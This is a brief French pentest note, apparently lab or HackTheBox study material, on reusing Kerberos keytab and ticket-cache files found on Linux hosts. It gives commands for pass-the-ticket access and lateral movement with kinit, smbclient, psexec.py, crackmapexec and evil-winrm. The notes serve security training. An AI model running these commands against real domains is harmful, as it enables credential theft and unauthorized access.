---
public: true # set to true to make the article publishable
---
On peut utiliser la commande `realm` pour avoir des informations sur l'authentification kerberos configurée sur une machine linux.

Un fichier keytab contient les clés liées à un compte utlisateur pour réaliser des authentification kerberos (demande de TGT)

Un fichier CCACHE est contient un ou plusieurs tickets kerberos.

Lorsqu'on trouve un fichier keytab et que l'on connait le nom d'utilisateur qui lui est associé (en utilisant par exemple KeyTab Extract,

## Trouver des fichiers keytab et CCACHE

Par défaut les fichiers `CCACHE` sont enregistrés dans `/tmp` mais seul l'utilisateur root peut y accéder


## Utilisation d'un Keytab
on peut utiliser le fichier Keytab à l'aide de `kinit` : 

```
# création d'un TGT à partir d'un keytab
kinit user@realm -k -t /chemin/vers/fichier.keytab # le ticket généré est stocké dans le CCACHE courant ou un CCACHE est créé (dans /tmp)
                                        # la variable KRB5CCNAME prend la valeur du fichier CCACHE si cela n'était pas déja le cas
# vérification des tickets disponibles
klist

# utilisation par exemple de smbclient
smbclient -k -no-pass //SRV/Share -c 'ls'
```


## Utilisation d'un CCACHE
Si on arrive à lire un CCACHE, on peut l'utiliser :

```
export KRB5CCNAME=/Path/to/Fichier.CCACHE

# Exemples d'utilisation
smbclient -k -no-pass //SRV/Share -c 'ls'

psexec.py  FQDN.domain.local -k -no-pass

## ATTENTION : cme n'utilise $KRB5CCNAME que si on utilise --use-kcache
crackmapexec smb dc01.inlanefreight.htb -k --use-kcache --shares


# Evil-WinRM (nécessite d'ajouter une entrée vers le KDC (voir -h))
proxychains evil-winrm -i FQDN.domain.local -r 'domain.local'
```


